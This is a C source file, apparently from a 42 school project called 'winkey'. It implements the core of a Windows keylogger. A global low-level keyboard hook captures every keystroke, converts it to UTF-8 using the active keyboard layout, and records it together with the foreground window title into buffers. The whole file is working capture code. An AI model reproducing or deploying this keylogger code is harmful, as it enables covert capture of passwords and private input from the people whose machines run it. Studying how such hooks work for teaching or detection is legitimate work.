/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   hook.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 16:58:59 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/15 18:29:27 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "winkey.h"

	#include <windows.h>

#pragma endregion

static char		PrevTitle[BUFFER_SIZE + 1];
static HHOOK	hook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

		HWND hwnd = GetForegroundWindow();
		if (hwnd) {
			char windowTitle[256];
			if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle))) {
				if (strcmp(PrevTitle, windowTitle)) {
					strcpy_s(PrevTitle, BUFFER_SIZE, windowTitle);
					TitleToBuffer(windowTitle);
				}
			}
		}

		BYTE keyState[256];
		WCHAR buffer[8] = {0};
		if (GetKeyboardState(keyState)) {
			HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(hwnd, NULL));
			int len = ToUnicodeEx(kbd->vkCode, kbd->scanCode, keyState, buffer, 8, 0, layout);
			if (len > 0) {
				char utf8[16];
				int conv = WideCharToMultiByte(CP_UTF8, 0, buffer, len, utf8, sizeof(utf8), NULL, NULL);
				if (conv > 0) {
					utf8[conv] = '\0';
					KeyToBuffer(utf8);
				}
			}
		}
	}

	return (CallNextHookEx(NULL, nCode, wParam, lParam));
}

DWORD WINAPI HookThread(LPVOID param) { (void) param;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (!hook) return (1);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);
	return (0);
}